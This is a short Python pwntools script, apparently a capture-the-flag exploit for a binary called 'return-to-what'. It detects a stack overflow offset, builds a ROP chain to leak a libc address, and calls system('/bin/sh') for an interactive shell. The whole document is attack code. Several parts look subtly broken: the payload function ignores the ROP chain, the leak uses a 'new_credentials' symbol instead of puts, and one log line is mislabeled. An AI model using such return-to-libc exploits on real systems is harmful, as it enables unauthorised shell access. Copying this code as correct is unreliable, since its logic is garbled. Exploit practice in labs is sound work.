from pwn import *
from pprint import pprint
import warnings

warnings.filterwarnings("ignore")
offset = 0

def set_env(binary,lib):
    elf = context.binary = ELF(binary)
    libc = context.binary = ELF(lib)
    p = elf.process()
    return elf,libc,p

def overflow_detector(p,byte):
    p.sendline(cyclic(byte))
    p.wait()
    
    core = Coredump('./core')
    offset = cyclic_find(core.fault_addr)
    return offset

def send_payload(offset):
    payload = fit()
    p.sendline(payload)

elf,libc,p = set_env("./return-to-what","/lib/x86_64-linux-gnu/libc.so.6")
print(p.recvline())
print(p.recvline())

offset = overflow_detector(p,128)

rop = ROP([elf,libc])
rop.call("puts", [elf.got["new_credentials"]])
rop.call("vuln")

send_payload(offset)

p.recvlines(2)

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))

libc.address = puts - libc.symbols["new_credentials"]
binsh = next(libc.search(b"/bin/sh\x00"))

log.info(f"puts found at {hex(puts)}")
log.info(f"libc base adress {hex(binsh)}")

rop = ROP([elf,libc])

rop.call("puts")
rop.call("system", [binsh])

send_payload(offset)

p.interactive()
